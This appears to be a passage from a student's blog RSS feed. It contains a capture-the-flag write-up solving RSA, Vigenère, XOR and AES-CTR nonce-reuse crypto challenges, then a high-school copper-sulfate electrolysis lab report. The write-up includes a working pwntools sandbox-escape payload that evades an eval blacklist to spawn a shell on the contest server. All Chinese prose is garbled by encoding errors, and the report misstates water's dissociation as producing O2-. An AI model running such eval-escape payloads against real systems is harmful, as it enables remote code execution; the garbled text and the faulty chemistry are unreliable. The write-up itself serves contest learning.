&lt;h2&gt;RSA&lt;/h2&gt;
&lt;p&gt;‰∏üÂéªrsa decoderÂ∞±Â•Ω&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;e = 0x10001
n = 94222487035514568148220182471104690931780594128516176949111095868335830867719277805539132735917016524185107312037557600880949236829032793818738351079213184870243702834570026012503355620032058527302541127368383734031131208254140211165705925154251280613034133968327987267589895419787888903387665859859148412543
b64_c = &amp;#39;N5lOVmbqGv0F1UiqdEy+T3Klilrwvp8cCZdLbnKPFWeqP9Mh/nzxtWC00G6GGPxmyMnOGdX9omDgxthlUAQGpaWeAnj84qrzU62Bq3m6RuP0pqE/wub6rMbHeK6gebgcd8GmUDX+gbhuLxtA4Z5+jyoyayi8t2xyCXHFtVXOm7Q=&amp;#39;
int_c = 39042841328709556214265103020897101350928166266738871446328808453325125686468702532379771433443668090510537708890843833523366699079886852742174164548701470967388728724472159586068406789847736565656024626914080978879991724002842467193318864530876999109696543271802935281934399726950922142641870912695365966772
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkR6XKRvA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h2&gt;Vigen√®re&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://www.guballa.de/vigenere-solver&quot;&gt;https://www.guballa.de/vigenere-solver&lt;/a&gt;
Áî®ÈÄôÂÄãÁ∂≤Á´ôËß£Â∞±Â•Ω‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/HkSzLY0PR.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h2&gt;‚äï (XOR)&lt;/h2&gt;
&lt;p&gt;È°åÁõÆÁ®ãÂºè&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3.10

from pwn import xor
from secret import flag, key

assert len(key) == 3

cipher = xor(flag, key).hex()

# transform the cipher into hex format
print(&amp;quot; &amp;quot;.join([cipher[i:i+2] for i in range(0, len(cipher), 2)]))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ëß£È°åÁ®ãÂºè&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import xor

ciphertext = &amp;#39;121f0213281b1b011c031a171c0c101c1c11000c08312a1c65001c1a63170b0006170611112e&amp;#39;
ciphertext_bytes = bytes.fromhex(ciphertext)

key = bytes([(ciphertext_bytes[0] ^ ord(&amp;#39;F&amp;#39;)),
             (ciphertext_bytes[1] ^ ord(&amp;#39;L&amp;#39;)),
             (ciphertext_bytes[2] ^ ord(&amp;#39;A&amp;#39;))
             ])

decrypted_bytes = xor(ciphertext_bytes, key)
print(decrypted_bytes)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Nonce Nonce&lt;/h2&gt;
&lt;p&gt;Âä†ÂØÜÁ®ãÂºè&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3.10

from secret import flag
from Crypto.Cipher import AES
from Crypto.Util.Counter import new 
from os import urandom
from Crypto.Util.Padding import pad

key = urandom(16)
iv = urandom(4)

def encrypt(plain, key=key):
    ctr = new(128 , initial_value=int.from_bytes(iv, &amp;#39;big&amp;#39;))
    aes = AES.new(key , mode=AES.MODE_CTR , counter=ctr)

    return aes.encrypt(pad(plain, 16))

print(encrypt(flag).hex())
print(encrypt(b&amp;quot;TSCCTF&amp;quot; * 6).hex())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ëß£È°åÁ®ãÂºè&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from Crypto.Util.strxor import strxor
import binascii
ciphertext1 = &amp;quot;a2dcf363fb24aee5fb6f56946710be19b9973e009339b5af3f6072985b3e51ab9162db9c5198e96f5ac81f14226b1de3&amp;quot;
ciphertext2 = &amp;quot;b0c3f167d42c95d8fb195d8000168e1fb2b85f0c974ad18d34076e936e1b6e9da052aea75198e96f5ac81f14226b1de3&amp;quot;
ct1 = binascii.unhexlify(ciphertext1)
ct2 = binascii.unhexlify(ciphertext2)
known_pt = b&amp;quot;TSCCTF&amp;quot; * 6
keystream = strxor(ct2, known_pt)
flag = strxor(ct1, keystream)

print(&amp;quot;Flag:&amp;quot;, flag)
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h1&gt;misc&lt;/h1&gt;
&lt;h2&gt;pyjail 1&lt;/h2&gt;
&lt;p&gt;nc ÈÄ£ÈÄ≤ÂéªÊúÉÂÖàÁúãÂà∞&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yih_0118@Macbook m774 % nc chall.nckuctf.org 8030
#!/usr/local/bin/python3

print(open(__file__).read())

inp = input(&amp;quot;&amp;gt;&amp;gt;&amp;gt; &amp;quot;)
blacklist = (&amp;quot;import&amp;quot;, &amp;quot;os&amp;quot;, &amp;quot;system&amp;quot;, &amp;quot;input&amp;quot;, &amp;quot;eval&amp;quot;, &amp;quot;exec&amp;quot;, &amp;quot;open&amp;quot;)
if not sum(bad in inp for bad in blacklist):
    print(eval(inp))
else:
    print(&amp;quot;bad boyQQ&amp;quot;)

&amp;gt;&amp;gt;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•ÁúãÂà∞ÊòØ&lt;code&gt;eval&lt;/code&gt;ÁöÑÊºèÊ¥û
‰ΩÜÊòØÊúÉÂÖàÊ™¢Ê∏¨ÊòØÂê¶Âê´Êúâ&lt;code&gt;blacklist&lt;/code&gt;‰∏≠ÁöÑ==Â≠ó==&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; globals()
{&amp;#39;__name__&amp;#39;: &amp;#39;__main__&amp;#39;, &amp;#39;__doc__&amp;#39;: None, &amp;#39;__package__&amp;#39;: None, &amp;#39;__loader__&amp;#39;: &amp;lt;_frozen_importlib_external.SourceFileLoader object at 0x7f1d37998c10&amp;gt;, &amp;#39;__spec__&amp;#39;: None, &amp;#39;__annotations__&amp;#39;: {}, &amp;#39;__builtins__&amp;#39;: &amp;lt;module &amp;#39;builtins&amp;#39; (built-in)&amp;gt;, &amp;#39;__file__&amp;#39;: &amp;#39;/home/pyjail/jail.py&amp;#39;, &amp;#39;__cached__&amp;#39;: None, &amp;#39;__warningregistry__&amp;#39;: {&amp;#39;version&amp;#39;: 0}, &amp;#39;inp&amp;#39;: &amp;#39;globals()&amp;#39;, &amp;#39;blacklist&amp;#39;: (&amp;#39;import&amp;#39;, &amp;#39;os&amp;#39;, &amp;#39;system&amp;#39;, &amp;#39;input&amp;#39;, &amp;#39;eval&amp;#39;, &amp;#39;exec&amp;#39;, &amp;#39;open&amp;#39;)}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *
r = remote(&amp;quot;chall.nckuctf.org&amp;quot;, 8030)
p = &amp;quot;globals()[&amp;#39;_&amp;#39;+&amp;#39;_builtins__&amp;#39;].__dict__[&amp;#39;__i&amp;#39;+&amp;#39;mport__&amp;#39;](&amp;#39;o&amp;#39;+&amp;#39;s&amp;#39;).__dict__[&amp;#39;s&amp;#39;+&amp;#39;ystem&amp;#39;](&amp;#39;sh&amp;#39;)&amp;quot;
r.sendlineafter(&amp;quot;&amp;gt;&amp;gt;&amp;gt; &amp;quot;, p)
r.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÈÄ≤Âéª‰πãÂæå &lt;code&gt;cat flag_432rdeoibhedqnjd&lt;/code&gt;Âç≥ÂèØ
&lt;img src=&quot;https://hackmd.io/_uploads/HkvGVFCDC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h2&gt;google form&lt;/h2&gt;
&lt;p&gt;ÂéªÊêúÂ∞ãÈóúÈçµÂ≠óÂ∞±Êúâ‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/HybAGKRwR.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Fri, 12 Jul 2024 18:11:10 GMT</pubDate></item><item><title>ÂåñÂ≠∏Êé¢Á©∂È´ò‰∫å</title><link>https://yih-0118.github.io/blog/%E5%8C%96%E5%AD%B8%E6%8E%A2%E7%A9%B6%E9%AB%98%E4%BA%8C/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/%E5%8C%96%E5%AD%B8%E6%8E%A2%E7%A9%B6%E9%AB%98%E4%BA%8C/</guid><description>Á¥ÄÈåÑ‰∏Ä‰∏ãÊé¢Á©∂ÂØ¶‰ΩúÔºåÊêû‰∏çÂ•Ω‰ª•ÂæåË¶ÅËÄÉÂ≠∏Ê∏¨</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/%E5%8C%96%E5%AD%B8%E6%8E%A2%E7%A9%B6%E9%AB%98%E4%BA%8C/&quot;&gt;https://yih-0118.github.io/blog/%E5%8C%96%E5%AD%B8%E6%8E%A2%E7%A9%B6%E9%AB%98%E4%BA%8C/&lt;/a&gt;&lt;/blockquote&gt; &lt;hr&gt;
&lt;h1&gt;È´ò‰∫åÂåñÂ≠∏Êé¢Á©∂&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;ÈõªËß£Á°´ÈÖ∏ÈäÖÊûêÂá∫Â•àÁ±≥ÈäÖ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;210Á¨¨‰∫åÁµÑ
2, 4, 5, 14, 23, 34&lt;/p&gt;
&lt;hr&gt;
&lt;hr&gt;
&lt;h2&gt;Â•àÁ±≥ÈäÖÈ°èËâ≤&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;Á≤íÂæëÔºànmÔºâ&lt;/th&gt;
&lt;th&gt;Á¥îÂ∫¶Ôºà%Ôºâ&lt;/th&gt;
&lt;th&gt;Êô∂Âûã&lt;/th&gt;
&lt;th&gt;È°èËâ≤&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Â•àÁ±≥Á¥ö&lt;/td&gt;
&lt;td&gt;60&lt;/td&gt;
&lt;td&gt;&amp;gt;99.9&lt;/td&gt;
&lt;td&gt;ÁêÉÂΩ¢&lt;/td&gt;
&lt;td&gt;ÈªëÁ¥ÖËâ≤&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;‰∫ûÂæÆÁ±≥Á¥ö&lt;/td&gt;
&lt;td&gt;500&lt;/td&gt;
&lt;td&gt;&amp;gt;99.5&lt;/td&gt;
&lt;td&gt;ÁêÉÂΩ¢&lt;/td&gt;
&lt;td&gt;Á¥ÖËâ≤&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;h3&gt;ÊàëÂÄëÊî∂ÈõÜÂà∞ÁöÑ&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ÈªëÁ¥ÖËâ≤&lt;/th&gt;
&lt;th&gt;Á¥ÖËâ≤&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJSgO8VSA.png&quot; alt=&quot;image&quot;&gt;&lt;/td&gt;
&lt;td&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyyQOIVBA.png&quot; alt=&quot;image&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;h2&gt;ÈõªËß£Á°´ÈÖ∏ÈäÖ&lt;/h2&gt;
&lt;hr&gt;
&lt;h3&gt;ÂÖ©ÂÅ¥ÈÉΩÊòØÊîæÈäÖÁâá&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Ê≠£Ê•µÂèçÊáâ&lt;/strong&gt;  $$Cu\longrightarrow Cu^{2+}+2e^{-}$$&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Ë≤†Ê•µÂèçÊáâ&lt;/strong&gt; $$Cu^{2+}+2e^{-}\longrightarrow Cu^{}$$ &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Ê∞¥Ê∫∂Ê∂≤Ëß£Èõ¢&lt;/strong&gt;  $$CuSO_4\longrightarrow Cu^{2+}+SO_4^{2-}$$$$H_2O\longrightarrow 2H^{+}+O^{2-}$$&lt;/p&gt;
&lt;hr&gt;
&lt;h4&gt;Êé¢Ë®éÈõªÂ£ìÂ∞çÂ•àÁ±≥ÈäÖÁöÑÊûêÂá∫Èáç&lt;/h4&gt;
&lt;hr&gt;
&lt;h3&gt;ÊéßÂà∂ËÆäÂõ†$$ CuSO_4ÁöÑÊøÉÂ∫¶ $$&lt;/h3&gt;
&lt;hr&gt;
&lt;h3&gt;Êìç‰ΩúËÆäÂõ†&lt;/h3&gt;
&lt;p&gt;ÈõªËß£ÊôÇÁöÑÈõªÂ£ì&lt;/p&gt;
&lt;hr&gt;
&lt;h3&gt;ÊáâËÆäËÆäÂõ†&lt;/h3&gt;
&lt;p&gt;Âú®Âõ∫ÂÆöÊôÇÈñìÂÖßÂ•àÁ±≥ÈäÖÁöÑÊûêÂá∫ÈáçÈáè&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Ë®≠Ë®àÂØ¶È©ó&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;$$Ê∫ñÂÇô0.5M \ CuSO_4Ê∞¥Ê∫∂Ê∂≤ 100 \ mL$$&lt;/li&gt;
&lt;li&gt;ÊèíÂÖ•Ê≠£Ë≤†ÈõªÊ•µ‰∏¶ÈÄöÈõª&lt;/li&gt;
&lt;li&gt;Á¥ÄÊôÇ120ÁßíÂæå‰∏¶Êì∑ÂèñÊï∏Êìö&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2&gt;ÂØ¶È©óÊï∏Êìö&lt;/h2&gt;
&lt;hr&gt;
&lt;h3&gt;ÈáçÈáèËàáÈõªÂ£ìÈóú‰øÇ&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;5v&lt;/th&gt;
&lt;th&gt;10v&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;ÂâçÊ≠£&lt;/td&gt;
&lt;td&gt;4.35&lt;/td&gt;
&lt;td&gt;4.38&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ÂâçË≤†&lt;/td&gt;
&lt;td&gt;4.48&lt;/td&gt;
&lt;td&gt;4.45&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ÂæåÊ≠£&lt;/td&gt;
&lt;td&gt;4.32&lt;/td&gt;
&lt;td&gt;4.31&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ÂæåË≤†&lt;/td&gt;
&lt;td&gt;4.51&lt;/td&gt;
&lt;td&gt;4.52&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ê≠£Ê•µÊ∏õÈáç&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;0.03&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;0.07&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ë≤†Ê•µÂ¢ûÈáç&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;0.03&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;0.07&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;h3&gt;ÊôÇÈñìËàáÈõªÊµÅÁ¥ÄÈåÑ&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;sec&lt;/th&gt;
&lt;th&gt;5v&lt;/th&gt;
&lt;th&gt;10v&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;td&gt;0.5&lt;/td&gt;
&lt;td&gt;0.85&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;60&lt;/td&gt;
&lt;td&gt;0.51&lt;/td&gt;
&lt;td&gt;0.87&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;90&lt;/td&gt;
&lt;td&gt;0.53&lt;/td&gt;
&lt;td&gt;0.90&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;120&lt;/td&gt;
&lt;td&gt;0.54&lt;/td&gt;
&lt;td&gt;0.92&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;150&lt;/td&gt;
&lt;td&gt;0.55&lt;/td&gt;
&lt;td&gt;0.94&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;180&lt;/td&gt;
&lt;td&gt;0.57&lt;/td&gt;
&lt;td&gt;0.97&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;ÂñÆ‰Ωç(A)&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3&gt;ÊôÇÈñìËàápHÁ¥ÄÈåÑ&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;sec&lt;/th&gt;
&lt;th&gt;5v&lt;/th&gt;
&lt;th&gt;10v&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;3.08&lt;/td&gt;
&lt;td&gt;5.37&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;td&gt;2.99&lt;/td&gt;
&lt;td&gt;4.97&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;60&lt;/td&gt;
&lt;td&gt;2.89&lt;/td&gt;
&lt;td&gt;4.45&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;90&lt;/td&gt;
&lt;td&gt;2.79&lt;/td&gt;
&lt;td&gt;4.16&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;120&lt;/td&gt;
&lt;td&gt;2.70&lt;/td&gt;
&lt;td&gt;3.79&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;h4&gt;ÂÖ¨ÂºèË≠âÊòé&lt;/h4&gt;
&lt;hr&gt;
&lt;h3&gt;Áî®Ê≥ïÊãâÁ¨¨ÈõªËß£ÂÆöÂæã&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;Á¨¨‰∏ÄÈõªËß£ÂÆöÂæã&lt;/h4&gt;
&lt;p&gt;Á¨¨‰∏ÄÈõªËß£ÂÆöÂæãË™™Êòé‰∫ÜÁî¢ÁîüÊàñÊ∂àËÄóÁöÑÁâ©Ë≥™ÁöÑË≥™ÈáèËàáÈÄöÈÅéÊ∫∂Ê∂≤ÁöÑÈõªËç∑Èáè‰πãÈñìÁöÑÈóú‰øÇ&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;$$Z = \frac{M}{Q}$$&lt;/p&gt;
&lt;p&gt;ÂÖ∂‰∏≠Ôºö
M  ÊòØÁî¢ÁîüÊàñÊ∂àËÄóÁöÑÁâ©Ë≥™ÁöÑË≥™Èáè
Z  ÊòØÈõªËß£Áï∂Èáè
Q  ÊòØÈÄöÈÅéÊ∫∂Ê∂≤ÁöÑÈõªËç∑Èáè&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ryuIOVHSC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkRDd4BrA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3&gt;Ë®àÁÆóËàáË´ñË≠â&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;ÂØ¶È©óÊï∏Êìö&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ÈõªÂ£ì&lt;/th&gt;
&lt;th&gt;ÂâçÊ≠£Ê•µ (g)&lt;/th&gt;
&lt;th&gt;ÂâçË≤†Ê•µ (g)&lt;/th&gt;
&lt;th&gt;ÂæåÊ≠£Ê•µ (g)&lt;/th&gt;
&lt;th&gt;ÂæåË≤†Ê•µ (g)&lt;/th&gt;
&lt;th&gt;Ê≠£Ê•µÊ∏õÈáç (g)&lt;/th&gt;
&lt;th&gt;Ë≤†Ê•µÂ¢ûÈáç (g)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;5V&lt;/td&gt;
&lt;td&gt;4.35&lt;/td&gt;
&lt;td&gt;4.48&lt;/td&gt;
&lt;td&gt;4.32&lt;/td&gt;
&lt;td&gt;4.51&lt;/td&gt;
&lt;td&gt;0.03&lt;/td&gt;
&lt;td&gt;0.03&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;10V&lt;/td&gt;
&lt;td&gt;4.38&lt;/td&gt;
&lt;td&gt;4.45&lt;/td&gt;
&lt;td&gt;4.31&lt;/td&gt;
&lt;td&gt;4.52&lt;/td&gt;
&lt;td&gt;0.07&lt;/td&gt;
&lt;td&gt;0.07&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;h4&gt;Ë®àÁÆóÈÅéÁ®ã&lt;/h4&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Ë®àÁÆóÈõªËç∑Èáè Q&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;$$Q = I \cdot t$$&lt;/p&gt;
&lt;hr&gt;
&lt;h3&gt;5V Ê¢ù‰ª∂‰∏ãÁöÑË®àÁÆó&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;ÈõªÊµÅÈö®ÊôÇÈñìËÆäÂåñ&lt;/strong&gt;Ôºö&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;sec&lt;/th&gt;
&lt;th&gt;5v&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;td&gt;0.5&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;60&lt;/td&gt;
&lt;td&gt;0.51&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;90&lt;/td&gt;
&lt;td&gt;0.53&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;120&lt;/td&gt;
&lt;td&gt;0.54&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;150&lt;/td&gt;
&lt;td&gt;0.55&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;180&lt;/td&gt;
&lt;td&gt;0.57&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Ë®àÁÆóÊØèÂÄãÊôÇÈñìÊÆµÁöÑÈõªËç∑&lt;/strong&gt;Ôºö
$$ 30s:  Q_{30} = 0.5\times 30 = 15  $$$$60s:  Q_{60} = 0.51 \times 30 = 15.3 $$$$90s:  Q_{90} = 0.53 \times 30 = 15.9 $$$$120s:  Q_{120} = 0.54 \times 30 = 16.2 $$$$150s:  Q_{150} = 0.55 \times 30 = 16.5 $$$$180s:  Q_{180} = 0.57 \times 30 = 17.1 $$&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Á∏ΩÈõªËç∑&lt;/strong&gt;Ôºö&lt;/p&gt;
&lt;p&gt;$$ Q_{total} =  96\text{ C} $$&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Ë®àÁÆóÊûêÂá∫ÈäÖÁöÑË≥™Èáè&lt;/strong&gt;Ôºö&lt;/p&gt;
&lt;p&gt;$$ m = \frac{Q \cdot M}{n \cdot F} = \frac{96 \times 63.5}{2 \times 96500} \approx 0.0315 \text{ g} $$&lt;/p&gt;
&lt;hr&gt;
&lt;h3&gt;10V Ê¢ù‰ª∂‰∏ãÁöÑË®àÁÆó&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;ÈõªÊµÅÈö®ÊôÇÈñìËÆäÂåñ&lt;/strong&gt;Ôºö&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;sec&lt;/th&gt;
&lt;th&gt;10v&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;td&gt;0.85&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;60&lt;/td&gt;
&lt;td&gt;0.867&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;90&lt;/td&gt;
&lt;td&gt;0.901&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;120&lt;/td&gt;
&lt;td&gt;0.918&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;150&lt;/td&gt;
&lt;td&gt;0.935&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;180&lt;/td&gt;
&lt;td&gt;0.969&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Ë®àÁÆóÊØèÂÄãÊôÇÈñìÊÆµÁöÑÈõªËç∑&lt;/strong&gt;Ôºö&lt;/p&gt;
&lt;p&gt;$$30s:  Q_{30} = 0.85 \times 30 = 25.5$$$$60s:  Q_{60} = 0.87 \times 30 = 26.01$$$$90s:  Q_{90} = 0.90 \times 30 = 27.03$$$$120s:  Q_{120} = 0.92 \times 30 = 27.54$$$$150s:  Q_{150} = 0.94 \times 30 = 28.05$$$$180s:  Q_{180} = 0.97 \times 30 = 29.07$$  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Á∏ΩÈõªËç∑&lt;/strong&gt;Ôºö&lt;/p&gt;
&lt;p&gt;$$ Q_{total} = 163.2
 \text{ C}$$&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Ë®àÁÆóÊûêÂá∫ÈäÖÁöÑË≥™Èáè&lt;/strong&gt;Ôºö&lt;/p&gt;
&lt;p&gt;$$ m = \frac{Q \cdot M}{n \cdot F} = \frac{163.2 \times 63.5}{2 \times 96500} \approx 0.0537 \text{ g} $$&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Â∞çÊØîÂØ¶È©óË®òÈåÑ&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ÈõªÂ£ì&lt;/th&gt;
&lt;th&gt;Ë®àÁÆóÂÄº&lt;/th&gt;
&lt;th&gt;ÂØ¶ÈöõÂÄº&lt;/th&gt;
&lt;th&gt;Áõ∏Â∞çË™§Â∑Æ&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;5V&lt;/td&gt;
&lt;td&gt;0.0315&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;0.03&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;$$\approx 5.3%$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;10V&lt;/td&gt;
&lt;td&gt;0.0537&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;0.07&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;$$\approx 23.2%$$&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;h3&gt;ÂàÜÊûê&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;Âú®Êï∏Êìö‰∏≠Á¢∫ÂØ¶ÊèêÈ´òÈõªÂ£ìÂæåÊúÉÈöäÁî¢ÈáèÊúâÁõ∏ÈóúÊÄß
‰ΩÜÂú®Ë®àÁÆó‰πãÂæå
ËÄÉÈáèÂà∞ÈõªËß£ÂæåÊúÉÊúâÊ∞¥ÂàÜÊÆòÁïôÈÄ†ÊàêË™§Â∑Æ&lt;/p&gt;
&lt;hr&gt;
&lt;h3&gt;ÂØ¶È©óÁÖßÁâá&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HkWYWnVr0.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
